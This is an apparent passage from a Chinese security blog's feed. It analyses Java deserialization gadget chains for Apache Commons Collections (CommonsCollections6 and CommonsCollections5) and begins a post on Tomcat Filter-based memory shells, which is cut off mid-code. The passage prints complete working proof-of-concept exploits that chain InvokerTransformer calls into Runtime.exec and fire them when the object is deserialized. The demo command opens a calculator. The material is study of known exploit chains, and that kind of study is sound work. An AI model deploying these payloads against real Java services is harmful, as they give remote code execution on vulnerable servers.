class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><strong>坑点！！！</strong></p><p>如果有同学将 key 取值成<code>keyTest</code>，而不是<code>aaa</code>时，会发现报错为空<br><img src="images/image-20221008174729245.png" alt="image-20221008174729245"></p><p>调试了一下，发现如果<code>key</code>为<code>keyTest</code>字符串时，变成了<code>array[4]</code>才能取到我们前面设置的值。<br><img src="images/image-20221008174748438.png" alt="image-20221008174748438"></p><p>这是为什么呢？继续怀着好奇心调试，发现问题还是在 put 上，可以看到这里对<code>key</code>传进了<code>hash()</code>方法中进行运算<br><img src="images/image-20221008174930212.png" alt="image-20221008174930212"></p><p><img src="images/image-20221008180314692.png" alt="image-20221008180314692"></p><p>因此 key 为<code>aaa</code>和<code>keyTest</code>的值完全不同，导致了最后 i 分别为 0 和 4<br><img src="images/image-20221008175056295.png" alt="image-20221008175056295"></p><p><img src="images/image-20221008175106525.png" alt="image-20221008175106525"></p><p>因此修改最终 POC为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/4 21:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,<span class="string">&quot;keyTest&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;keyTest&quot;</span>;</span><br><span class="line">        expMap.put(key ,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射获取table</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[]) table.get(expMap);</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[((h=key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>)) &amp; (array.length -<span class="number">1</span>)];</span><br><span class="line">        <span class="type">Field</span> <span class="variable">expMapKey</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        expMapKey.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        expMapKey.set(node, tiedMapEntry);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221008180530399.png" alt="image-20221008180530399"></p><h2 id="ysoserial的做法"><a href="#ysoserial的做法" class="headerlink" title="ysoserial的做法"></a>ysoserial的做法</h2><p>接着看看<code>ysoserial</code>的实现，给出的利用链为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    by @matthias_kaiser</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>对比前面的，可以发现<code>ysoserial</code>采用的是<code>HashSet</code>，在<code>HashSet#readObject()</code>方法中最后会调用到<code>HashMap#put()</code><br><img src="images/image-20221009103459255.png" alt="image-20221009103459255"></p><p>而通过前面的分析，我们知道<code>HashMap#put()</code>最终也会调用到<code>hashCode()</code>方法，这里就不赘述了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections5利用链分析</title>
      <link href="/2022/11/10/CommonsCollections5/"/>
      <url>/2022/11/10/CommonsCollections5/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections5-利用链分析"><a href="#CommonsCollections5-利用链分析" class="headerlink" title="CommonsCollections5 利用链分析"></a>CommonsCollections5 利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天接着学习<code>CommonsCollections5</code>利用链，利用环境如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK 8u76之前</span><br></pre></td></tr></table></figure></p><p><code>ysoserial</code>给出的利用链如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>前面的<code>BadAttributeValueExpException</code>和<code>TiedMapEntry</code>倒是新知识，后面的则是前面<code>CommonsCollections1</code>的内容。看样子这条链子是找了其他能触发<code>LazyMap#get()</code>的方法。</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>按照利用链跟进能触发<code>LazyMap#get()</code>方法的<code>TiedMapEntry</code>类的<code>toString()</code>方法<br><img src="images/image-20221011112752765.png" alt="image-20221011112752765"></p><p>跟进<code>getValue()</code>方法源码<br><img src="images/image-20221011112827805.png" alt="image-20221011112827805"></p><p>可以看到调用了<code>map.get()</code>方法，而<code>map</code>是通过构造方法传入的值，完全可控。接下来就是找到能触发<code>TiedMapEntry#toString()</code>方法的地方，在<code>CommonsCollections5</code>用到的是<code>BadAttributeValueExpException</code>类，跟进该类的<code>readObject()</code>方法<br><img src="images/image-20221011144219939.png" alt="image-20221011144219939"></p><p>其中<code>valObj</code>是从成员属性取的<code>val</code>，而<code>val</code>我们可以通过反射控制，因此成为可控点。并且<code>System.getSecurityManager()</code>方法默认为<code>null</code>，因此可以进入<code>else if</code>条件触发<code>valObj.toString();</code></p><p>开始编写 POC<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/11 11:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections5</span> <span class="variable">commonsCollections5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections5</span>();</span><br><span class="line">        commonsCollections5.serialize();</span><br><span class="line">        commonsCollections5.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="number">666</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(badAttributeValueExpException);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221011144759763.png" alt="image-20221011144759763"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat内存马之Filter</title>
      <link href="/2022/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2022/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat内存马之Filter"><a href="#Tomcat内存马之Filter" class="headerlink" title="Tomcat内存马之Filter"></a>Tomcat内存马之Filter</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于 Filter 的知识，在前面<a href="../../01-JavaWeb基础/2-Filter/Filter.md">Filter</a>章节已经学习过，这里不再赘述，直接进入分析环节。</p><h2 id="Filter流程分析"><a href="#Filter流程分析" class="headerlink" title="Filter流程分析"></a>Filter流程分析</h2><p>先编写一个简单的 Filter 实现类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span 